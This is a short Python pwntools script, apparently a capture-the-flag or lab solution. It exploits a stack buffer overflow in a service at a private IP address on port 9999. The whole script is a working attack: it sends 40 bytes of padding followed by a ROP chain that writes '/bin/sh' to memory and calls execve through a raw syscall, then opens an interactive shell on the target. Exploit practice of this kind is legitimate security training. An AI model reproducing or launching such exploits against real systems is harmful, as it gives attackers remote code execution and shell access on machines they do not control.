#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

host = "10.211.55.6"
port = 9999

r = remote(host,port)
context.arch = "amd64"
mov_drdi_rsi = 0x000000000047a502
pop_rdi = 0x0000000000401456
pop_rsi = 0x0000000000401577
buf = 0x6c9a20
pop_rax_rdx_rbx = 0x0000000000478516
syscall = 0x00000000004671b5
#execve("/bin/sh",0,0)
payload = "a"*40 + flat([pop_rdi,buf,pop_rsi,"/bin/sh\x00",mov_drdi_rsi,pop_rsi,0,pop_rax_rdx_rbx,0x3b,0,0,syscall])
r.recvuntil(":")
r.sendline(payload)
r.interactive()
